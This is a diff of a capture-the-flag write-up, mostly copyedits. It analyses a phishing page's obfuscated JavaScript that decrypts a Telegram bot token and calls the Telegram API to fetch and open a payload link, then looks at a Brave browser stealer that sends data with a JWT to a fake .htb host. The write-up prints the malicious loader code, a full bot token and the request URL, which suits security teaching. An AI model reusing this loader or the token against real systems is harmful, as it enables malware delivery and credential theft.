@@ -25,12 +25,12 @@ last_update: 2025-03-29T00:00:00+00:00
 
 ![](https://i.imgur.com/JCKcHuS.png)
 
-- So the javascript is obfuscated and uses `CryptoJS`, we can use an online deobfuscator : 
+- So the JavaScript is obfuscated and uses `CryptoJS`, we can use an online deobfuscator : 
 
 
 ![](https://i.imgur.com/XjIy88q.png)
 
-- Another better alternative is to use debugger in the browser, using debugger is simple, just open tools, click on debugger, hit pause and submit the form and the decoded javascript is revealed : 
+- Another better alternative is to use debugger in the browser, using debugger is simple, just open tools, click on debugger, hit pause and submit the form and the decoded JavaScript is revealed : 
 
 
 ![](https://i.imgur.com/bLswUQG.png)
@@ -83,7 +83,7 @@ last_update: 2025-03-29T00:00:00+00:00
     function f(oferkfer, icd) { const channel_id = -1002496072246; var enc_token = _$_5975\\[0]; if (oferkfer === G(_$_5975[1]) && CryptoJS[_$_5975[7]\](sequence[_$_5975[6]](_$_5975[5]))\[_$_5975[4]\](CryptoJS[_$_5975[3]\][_$_5975[2]]) === _$_5975\\[8]) { var decrypted = CryptoJS[_$_5975[12]\][_$_5975[11]\](enc_token, CryptoJS\[_$_5975[3]\][_$_5975[9]]\[_$_5975[10]](oferkfer), { drop: 192 })\[_$_5975[4]\](CryptoJS[_$_5975[3]\][_$_5975[9]]); var HOST = _$_5975\\[13] + String[_$_5975[14]\](0x2f) + String\[_$_5975[14]\](0x62) + String\[_$_5975[14]\](0x6f) + String\[_$_5975[14]\](0x74) + decrypted; var xhr = new XMLHttpRequest(); xhr\[_$_5975[15]] = function () { if (xhr[_$_5975[16]] == XMLHttpRequest[_$_5975[17]]) { const resp = JSON[_$_5975[10]\](xhr[_$_5975[18]]); try { const link = resp\[_$_5975[20]\][_$_5975[19]]; window\[_$_5975[23]\][_$_5975[22]\](link) } catch (error) { alert(_$_5975\[24]) } } }; xhr[_$_5975[29]\](_$_5975[25], HOST + String[_$_5975[14]](0x2f) + _$_5975\[26] + icd + _$_5975[27] + channel_id + _$_5975[28]); xhr[_$_5975[30]\](null) } else { alert(_$_5975[24]) } }
 ```
 
-- Its an array and multiple items from the array were being used, so I decided to print the array, by adding a small loop : 
+- It's an array and multiple items from the array were being used, so I decided to print the array, by adding a small loop : 
 
 ```
     for (var i = 0; i < 31; i++) {
@@ -131,7 +131,7 @@ last_update: 2025-03-29T00:00:00+00:00
 ```
 
 - So the email to satisfy the condition should be `0p3r4t10n_4PT_Un10n@abc.com` but since the script is running locally we can simply bypass the conditions
-- In the end the code block sends a GET request so I inspected the URL : 
+- In the end the code block sends a GET request, so I inspected the URL : 
 
 ```
     console.log('GET', HOST + String.fromCharCode(0x2f) + 'forwardMessage?chat_id=' + icd + '&from_chat_id=' + channel_id + '&message_id=5')
@@ -139,7 +139,7 @@ last_update: 2025-03-29T00:00:00+00:00
     GET https://api.telegram.org/bot7767830636:AAF5Fej3DZ44ZZQbMrkn8gf7dQdYb3eNxbc/forwardMessage?chat_id=NaN&from_chat_id=-1002496072246&message_id=5 decrypted.js:128:17
 ```
 
-- So the telegram API is being called and we get the following things : 
+- So the telegram API is being called, and we get the following things : 
 
 ```
     Bot ID : bot7767830636
@@ -155,7 +155,7 @@ last_update: 2025-03-29T00:00:00+00:00
     Bot should be present on both chats
 ```
 
-- But in the URL we can see that `chat_id` is missing, so we will make our own by creating a `group` in telegram and then we can add the bot to our group
+- But in the URL we can see that `chat_id` is missing, so we will make our own by creating a `group` in telegram, and then we can add the bot to our group
 - But we don’t know the name of the bot, to solve this there is another endpoint we can call : 
 
 ```
@@ -185,8 +185,8 @@ last_update: 2025-03-29T00:00:00+00:00
 
 
 - We got a zip file which contains a tool that targets Brave browser, inside the zip is a windows PE file
-- Time for dynamic analysis, after using `Process Explorer, Process Monitor` etc I finally checked `WireShark` for network activity because a browser stealer is expected to send the information
-- And a single DNS query popped up : `z0lsc2S65u.htb` which obviously does not exists
+- Time for dynamic analysis, after using `Process Explorer, Process Monitor` etc. I finally checked `WireShark` for network activity because a browser stealer is expected to send the information
+- And a single DNS query popped up : `z0lsc2S65u.htb` which obviously does not exist
 - So I did the following :
 
 ```
@@ -206,7 +206,7 @@ last_update: 2025-03-29T00:00:00+00:00
 
 
 
-- JSON data was being sent but more interestingly there was an `Authorization` header with JWT :
+- JSON data was being sent but more interestingly there was a `Authorization` header with JWT :
 
 
 ![](https://i.imgur.com/vTH0E4n.png)
